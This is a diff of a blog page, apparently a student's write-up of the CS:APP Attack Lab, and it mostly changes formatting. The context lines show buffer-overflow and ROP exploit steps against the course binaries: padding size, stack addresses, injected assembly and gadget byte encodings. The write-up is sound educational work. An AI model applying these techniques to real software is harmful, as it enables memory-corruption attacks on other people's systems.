@@ -87,7 +87,7 @@
 <meta property="og:site_name" content="Aria">
 <meta property="og:description" content="[CS:APP-ch3] Attack Lab  Part 1：缓冲区溢出攻击  Phase  1 1 2 3 4 5 6 7 8 9 [--------------------------code-----------------------]    0x4017a5:	nop    0x4017a6:	nop    0x4017a7:	nop =&amp;gt; 0x4017a8 &amp;lt;getbu">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2018-10-16T12:01:49.995Z">
+<meta property="og:updated_time" content="2018-10-16T12:05:14.910Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[CS:APP-ch3] Attack Lab">
 <meta name="twitter:description" content="[CS:APP-ch3] Attack Lab  Part 1：缓冲区溢出攻击  Phase  1 1 2 3 4 5 6 7 8 9 [--------------------------code-----------------------]    0x4017a5:	nop    0x4017a6:	nop    0x4017a7:	nop =&amp;gt; 0x4017a8 &amp;lt;getbu">
@@ -427,6 +427,7 @@
 <span class="line">   <span class="number">0x4017b4</span> &lt;getbuf+<span class="number">12</span>&gt;:	mov    $<span class="number">0x1</span>,%eax</span>
 <span class="line">   <span class="number">0x4017b9</span> &lt;getbuf+<span class="number">17</span>&gt;:	add    $<span class="number">0x28</span>,%rsp</span>
 </pre></td></tr></table></figure>
+<a id="more"></a>
 <p>buf开创0x28 = 40 个字节<br>
 随便填充40个字符</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
@@ -474,6 +475,7 @@ c0 17 40 00 00 00 00 00<br>
 <span class="line"><span class="number">0048</span>| <span class="number">0x5561dca8</span> --&gt; <span class="number">0x0</span> </span>
 <span class="line"><span class="number">0056</span>| <span class="number">0x5561dcb0</span> --&gt; <span class="number">0x401f24</span> (&lt;launch+<span class="number">112</span>&gt;:	cmpl   $<span class="number">0x0</span>,<span class="number">0x2025bd</span>(%rip)        # <span class="number">0x6044e8</span> &lt;is_checker&gt;)</span>
 </pre></td></tr></table></figure>
+<br>
 <h3 id="phase-2"><a class="markdownIt-Anchor" href="#phase-2"></a> Phase 2</h3>
 <p>touch2 有参数传递，要改变寄存器rdi里存放的值</p>
 <p>结果：</p>
@@ -534,6 +536,7 @@ ret时返回到0x5561dc78（%rsp的地址？）执行注入的代码，然后直
 <span class="line"><span class="number">0048</span>| <span class="number">0x5561dca8</span> --&gt; <span class="number">0x0</span> </span>
 <span class="line"><span class="number">0056</span>| <span class="number">0x5561dcb0</span> --&gt; <span class="number">0x401f24</span> (&lt;launch+<span class="number">112</span>&gt;:	cmpl   $<span class="number">0x0</span>,<span class="number">0x2025bd</span>(%rip)        # <span class="number">0x6044e8</span> &lt;is_checker&gt;)</span>
 </pre></td></tr></table></figure>
+<br>
 <h3 id="phase-3"><a class="markdownIt-Anchor" href="#phase-3"></a> Phase 3</h3>
 <p>touch3参数是string<br>
 将str存到0x5561dcb8的地址上<br>
@@ -567,6 +570,7 @@ code将str拷贝到%rdi<br>
 </pre></td><td class="code"><pre><span class="line">mov $<span class="number">0x5561dcb8</span>,%rdi</span>
 <span class="line">ret</span>
 </pre></td></tr></table></figure>
+<br>
 <h2 id="part2-rop"><a class="markdownIt-Anchor" href="#part2-rop"></a> Part2: ROP</h2>
 <h3 id="phase-4"><a class="markdownIt-Anchor" href="#phase-4"></a> Phase 4</h3>
 <p>看了看文档，解释的很清楚w<br>
@@ -586,7 +590,7 @@ code将str拷贝到%rdi<br>
 popq %rax的编码是58<br>
 movq %rax %rdi的编码是48 89 c7</p>
 <p>在rtarget.d里找到这两个代码片段</p>
-<p>#####gadget1</p>
+<p><strong>gadget1</strong></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
 <span class="line">2</span>
 <span class="line">3</span>
@@ -595,7 +599,7 @@ movq %rax %rdi的编码是48 89 c7</p>
 <span class="line">  <span class="number">4019</span>ad:	c3                   	retq</span>
 </pre></td></tr></table></figure>
 <p>地址为0x4019ab</p>
-<p>#####gadget2</p>
+<p><strong>gadget2</strong></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
 <span class="line">2</span>
 <span class="line">3</span>
